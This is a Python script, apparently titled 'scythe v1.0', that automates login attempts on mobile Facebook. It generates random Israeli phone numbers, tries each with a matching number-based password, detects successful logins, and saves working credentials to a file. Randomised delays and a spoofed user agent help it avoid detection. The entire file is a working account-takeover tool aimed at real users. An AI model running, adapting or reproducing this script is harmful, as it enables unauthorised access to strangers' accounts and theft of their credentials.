# Github : @Hunterfollow123 	
# FB 	 : @Abrk D. Anwar   	
import mechanicalsoup
import time
import os
import random


user_agents = [
    "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.1805 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; SM-T555 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; Lenovo-A6020l36 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1"
]

prefixes = [
    '52',
    '54',
    '50',
    '53'
]


b = mechanicalsoup.StatefulBrowser(
            soup_config={'features': 'xml'},
            raise_on_404=True,
            user_agent=user_agents[4]
    )


loginUrl = 'https://m.facebook.com/login?refsrc=deprecated&_rdr'
loginParams = 'https://m.facebook.com/login/?email'
foundUrl = 'https://m.facebook.com/login/save-device'
code = '+972'

banner = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀scythe v1.0
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀ 
⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀	@Hunterfollow123
⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀	  @Abrk D. Anwar
⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀	
⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆	    CTRL + C TO EXIT.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇	
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁

⠀⠀⠀⠀	      YOUR TIME HAS COME.
"""

def clear():
    os.system('clear||cls')


def genNumber(prefixList, countryCode):
    suffix = random.randint(1000000, 9999999)
    prefix = random.choice(prefixList)
    user = f'{countryCode} {prefix} {suffix}'
    password = f'0{prefix}{suffix}'
    return user, password


def postData(user, password, login):
    global loginUrl
    if login not in b.get_url() and loginUrl not in b.get_url():
        b.open(loginUrl)
    b.select_form()
    b['email'] = user
    b['pass'] = password
    b.submit_selected()


def checkResp(found, notFound):
    link = b.get_url()
    if found in link:
        return True
    elif notFound in link:
        return False
    else:
        return 'Unknown'


def saveCombo(creds):
    file = open('foundAccounts.txt', 'a')
    file.write(creds + '\n')
    file.flush()


def saveUnknown(creds):
    file = open('Unknown.txt', 'a')
    file.write(creds + '\n')
    file.flush()


def main():
    global loginUrl, loginParams
    global foundUrl
    print(banner)
    print(f'\n• Starting..\n')
    b.open(loginUrl)
    while True:
        try:
            user, password = genNumber(prefixes, code)
            postData(user, password, loginParams)
            # print(f'\nURL : {b.get_url()}')
            resp = checkResp(foundUrl, loginParams)

            if  resp == True:
                found = f'{user} : {password}'
                saveCombo(found)
                print(found + ' = True  Saved.')

            elif resp == False:
                print(f'{user} : {password} = False')

            else:
                unknown = f'{user} : {password}'
                saveUnknown(unknown)
                print(unknown + ' = Unknown?  Saved.')
            time.sleep(random.uniform(2, 7.5))
        except KeyboardInterrupt:
            print('\n\nExiting..')
            print("Found and Unknown accounts saved to 'foundAccounts.txt' & 'Unknown.txt'.\n")
            exit()


if __name__ == '__main__':
    main()

